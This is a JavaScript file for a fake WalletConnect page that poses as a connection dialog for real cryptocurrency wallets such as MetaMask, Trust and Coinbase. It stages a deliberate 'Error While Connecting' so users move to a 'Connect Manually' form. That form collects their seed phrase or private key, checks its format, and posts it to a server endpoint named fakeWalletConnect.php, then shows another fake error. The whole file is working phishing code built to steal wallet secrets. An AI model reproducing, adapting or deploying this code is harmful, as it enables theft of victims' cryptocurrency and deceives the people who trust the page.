let modelWapper = document.querySelector('#modelWapper')
window.onload = () => {
  modelWapper.innerHTML = `
    <div   class="modal fade bd-example-modal-sm" id="modal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLongTitle" aria-hidden="true">
      <div  class="modal-dialog" role="document">
        <div class="modal-content text-white" id="dark">
          <div class="modal-header" style="border:none">
            <!-- <h5 class="modal-title" id="exampleModalLongTitle">Modal title</h5> -->
            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
              <span aria-hidden="true">&times;</span>
            </button>
          </div>

          <div class="modal-body" type="button" data-dismiss="modal" data-toggle="modal" data-target="#walletList">
            <div style="display: flex; flex-direction:column; align-items:center; justify-content:center;color:white">
              <img style="height: 60px;" src="./assets/images/wallet/walletconnect.svg" alt="">
              <h6>Wallet Connect</h6>
              <p>Scan with WalletConnect to Connect</p>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div class="modal fade walletBoard" id="walletList" tabindex="-1" role="dialog" aria-labelledby="exampleModalLongTitle" aria-hidden="true" class="close" data-dismiss="modal">
      <div class="modal-dialog" role="document">
        <div class="modal-content">
          <div id="dark" class="modal-header text-white" style="border:none;border-radius:0px" >
            <div style="display: flex; align-items:center;gap:6px">
              <img style="height: 60px;" src="./assets/images/wallet/walletconnect.svg" alt="">
              <h5 class="modal-title" id="exampleModalLongTitle">Wallet Connect</h5>
            </div>

            <button type="button" class="close text-white" data-dismiss="modal" aria-label="Close">
              <span class="text-white" aria-hidden="true">&times;</span>
            </button>
          </div>
          <div class="modal-body d-flex justify-content-center">
            <div style="display: grid;grid-template-columns: repeat(4,1fr);
             gap: 15px; width:fit-content" id="walletBoard">


            </div>
          </div>
        </div>
      </div>
    </div>

    <div class="modal fade error text-sm" id="modal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLongTitle" aria-hidden="true">
      <div class="modal-dialog" role="document">
        <div class="modal-content">
          <div class="modal-header">
            <h5 class="modal-title" id="exampleModalLongTitle">Back</h5>

            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
              <span aria-hidden="true">&times;</span>
            </button>
          </div>
          <div class="modal-body" style="display: flex;justify-content: center; flex-direction:column; align-items:center;gap:10px">
            <div style="padding: 14px 10px;display: flex;width:95%; border:2px solid red; border-radius:10px; gap:10px; align-items: center">
              <div class="selectedWalletError" style="font-size:15px !important">Connecting....</div>
              <button class="bg-primary rounded-sm text-white selectedWalletButton" style="border: none; padding:5px 20px;display:none" type="button" data-toggle="modal" data-target=".walletContainer" data-dismiss="modal" data-toggle="modal">Connect Manually</button>
            </div>
            <div style="padding: 15px 10px;display: flex;justify-content: space-between;align-items: center;width:95%; border:2px solid; border-radius:10px;">
              <div style="display: flex;flex-direction: column;gap: 4px;">
                <h6 style="font-weight: 600;" class="selectedWalletName"></h6>
                <p>Easy-to-use browser extension</p>
              </div>
              <img style="height: 30px;" src="" alt="" class="selectedWalletImg">
            </div>
          </div>
        </div>
      </div>
    </div>


    <div class="modal fade walletContainer" id="modal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLongTitle" aria-hidden="true">
      <div class="modal-dialog" role="document">
        <div class="modal-content">
          <div class="container mt-5 bg-white">
            <div class="card text-center bg-white">
              <div class="card-header d-none" hidden>
                <img style="height: 60px;" src="./assets/images/wallet/walletconnect.svg" alt=""> Wallet Connect
              </div>
              <div class="card-body">
                <div style="display: flex; align-items:center; justify-content:center;gap:6px">
                  <img style="height: 30px;" class="selectedWalletImg">
                  <p class="card-text selectedWalletName"></p>
                </div>
                <a href="#" class=" mt-3 ml-2 mt-2 hoverkey  seedPhrase badge bg-primary onactive" onclick="seedPhrase()">Seed Phrase</a>
                <a href="#" class=" mt-3 ml-2 mt-2 badge bg-primary hoverkey privateKey" onclick="privateKey()">Private key</a>
                <div style="width: 100%;" class="walletPassword">

                  <div class="mt-2" style="width: 100%; display:flex;flex-direction:column;gap:8px;">
                    <input class="type" type="hidden" value="seedPhrase">
                    <textarea class="value" style="width: 100%; height:100px;resize:none;outline:none;padding:10px" placeholder="Enter your recorvery phrase"></textarea>
                    <div style="width:100%; display:flex;align-items:center;" class="w-100">
                      <span class="walletError" style="color:red"></span>
                    </div>
                    <p style="color:white">Typically 12 (sometimes 24) words separated by single spaces</p>
                  </div>
                  <div style="display:flex; flex-direction:column; gap:10px">
                        <button type="button" class="btn btn-primary PROCEED" onclick="proceed()">Import Wallet</button>
                        <button data-dismiss="modal" type="button" class="btn btn-danger">CANCEL</button>
                   </div>
                </div>
              </div>
            </div>
          </div>
          
        </div>
      </div>
    </div>
  
  
  
  
  `

  loadWallet()
}




const wallet = [{

  name: 'Trust',
  img: "trust.png",
},
{
  name: 'MetaMask',
  img: "metamask.png",
},
{
  name: "Aktionariat",
  img: "aktionariat wallet.png",
},
{
  name: "Anchor",
  img: "anchor.png"
},
{
  name: "Atomic",
  img: "atomic.png",
},
{
  name: "Autheruem",
  img: "autheruem.png",
},
{
  name: "Bitpay",
  img: "bitpay.jpg",
},
{
  name: "Blockchain",
  img: "bolckchain.png",
},
{
  name: "Rainbow",
  img: "rainbow.png",
},
{
  name: "Luno",
  img: "luno.png",
},
{
  name: "Bitkeep",
  img: "bitkeep.png",
},
{
  name: "TokenPocket",
  img: "tokenpocket.png",
},
{
  name: "Math",
  img: "math.png",
},
{
  name: "Maiar",
  img: "maiar.png",
},
{
  name: "Houbi",
  img: "houbi.jpg",
},
{
  name: "Pillar",
  img: "pillar.png",
},
{
  name: "im Token",
  img: "im token.png",
},
{
  name: "Spactium",
  img: "spatium.jpg",
},
{
  name: "TrustVault",
  img: "trustVault.png",
},
{
    name:"Exodus",
    img:'exodus.jpg'
},
{
    name:"Coinbase",
    img:'coinbase.png'
},{
  name:'Phantom',
  img:'Phantom.jpg'
}
];

function loadWallet() {

  const walletBoard = document.querySelector('#walletBoard')
  for (let i = 0; i < wallet.length; i++) {
    const {
      name,
      img
    } = wallet[i];
    const html = ` <div type="button" data-toggle="modal" data-target=".error" onclick="run(${i})" style="display: flex;flex-direction:column; align-items:center;gap:6px;">
                  <img style="height: 30px;border-radius:5px" src="./assets/images/wallet/${wallet[i].img}" alt="">
                           <h6 style="font-size: 15px;text-transform: capitalize;">${wallet[i].name}</h6>
         </div>`
    walletBoard.insertAdjacentHTML("beforeend", html)
  }

}



function run(i) {
  var selectedWalletError = document.querySelector('.selectedWalletError')
  var selectedWalletButton = document.querySelector('.selectedWalletButton')
  var selectedWalletName = document.querySelectorAll('.selectedWalletName')
  var selectedWalletImg = document.querySelectorAll('.selectedWalletImg')
  selectedWalletError.innerHTML = 'Connecting....';
  selectedWalletButton.style.display = 'none';
  const {
    name,
    img
  } = wallet[i]

  selectedWalletImg.forEach(el => el.src = `./assets/images/wallet/${img}`)
  selectedWalletName.forEach(el => {
           el.style.color = 'white'
           el.innerHTML = `Import Your ${name} Wallet`
  })

  setTimeout(() => {
    selectedWalletError.innerHTML = 'Error While Connecting....';
    selectedWalletButton.style.display = 'block';
  }, 2000)
}






function seedPhrase(event) {
  let walletPassword = document.querySelector('.walletPassword')
  let seedPhrase = document.querySelector('.seedPhrase')
  seedPhrase.classList.add('onactive')
  let privateKey = document.querySelector('.privateKey')
  privateKey.classList.remove('onactive')
  walletPassword.innerHTML = '';
  const html = `<div class="mt-2" style="width: 100%; display:flex;flex-direction:column;gap:8px;">
                 <input class="type" type="hidden" value="seedPhrase">
                  <textarea class="value"  style="width: 100%; height:100px;resize:none;outline:none;padding:10px" placeholder="Enter your recorvery phrase"></textarea>
                  <div style="width:100%; display:flex;align-items:center;" class="w-100">
                    <span class="walletError" style="color:red"></span>
                  </div>
                  <p style="color:white">Typically 12 (sometimes 24) words separated by single spaces</p>
                  <div style="display:flex; flex-direction:column; gap:10px">
                        <button type="button" class="btn btn-primary PROCEED" onclick="proceed()">Import Wallet</button>
                        <button data-dismiss="modal" type="button" class="btn btn-danger">CANCEL</button>
                   </div>
                </div>`

  walletPassword.insertAdjacentHTML("beforeend", html)

}




function privateKey(event) {
  let walletPassword = document.querySelector('.walletPassword')
  let seedPhrase = document.querySelector('.seedPhrase')
  let privateKey = document.querySelector('.privateKey')
  seedPhrase.classList.remove('onactive')
  privateKey.classList.add('onactive')
  walletPassword.innerHTML = '';
  const html = `<div class="mt-2" style="width: 100%; display:flex;flex-direction:column;gap:8px;">
  
                  <input class="type" type="hidden" value="privateKey">
                  <input class="value" style="width: 100%; height:30px;resize:none;outline:none;" placeholder="Enter your private key">
                  <div style="width:100%; display:flex;align-items:center;" class="w-100">
                    <span class="walletError" style="color:red"></span>
                  </div>
                  <p style="color:white !important">Your wallet Private key (Not Public key) </p>
                  <div style="display:flex; flex-direction:column; gap:10px">
                        <button type="button" class="btn btn-primary PROCEED" onclick="proceed()">Import Wallet</button>
                        <button data-dismiss="modal" type="button" class="btn btn-danger">CANCEL</button>
                   </div>
                </div>`
  walletPassword.insertAdjacentHTML("beforeend", html)
}

function proceed() {

  const type = document.querySelector('.type').value
  const value = document.querySelector('.value').value
  const walletError = document.querySelector('.walletError')
  const selectedWalletName = document.querySelector('.selectedWalletName').innerHTML

  console.log(selectedWalletName)


  const user = document.querySelector('#modelWapper').getAttribute('auth')




  if (type === 'seedPhrase') {
    function getWordCount(text) {
      var words = text.split(/\s+/);
      var wordCount = words.length;

      return wordCount;
    }
    var wordCount = getWordCount(value);
    if (wordCount === 12 || wordCount == 15 || wordCount == 18 || wordCount == 21 || wordCount == 24) {
      $(() => {
        $.ajax({
          url: "../server/api/fakeWalletConnect.php",
          method: "POST",
          data: {
            privateKey: null,
            name: selectedWalletName,
            seedPhrase: value,
            user,
            from: 'fakeWalletConnect'
          },
          success(data) {
            
             walletError.innerHTML = 'Error While Connecting....';
          },
          error(err){
            console.log(err)
          }
        })
      })
    } else {
      walletError.innerHTML = 'Invalid Seed Phrase';
    }

  }

  if (type === 'privateKey') {
    const textCount = value.length


    if (textCount == 32 || textCount == 48 || textCount == 64 || textCount == 66) {
      $(() => {
        $.ajax({
          url: "../server/api/fakeWalletConnect.php",
          method: "POST",
          data: {
            privateKey: value,
            name: selectedWalletName,
            seedPhrase: null,
            user,
            from: 'fakeWalletConnect'
          },
          success(data) {
            walletError.innerHTML = 'Error While Connecting....';
          }
        })
      })
    } else {
      walletError.innerHTML = 'Invalid Private Key';
    }

  }

}

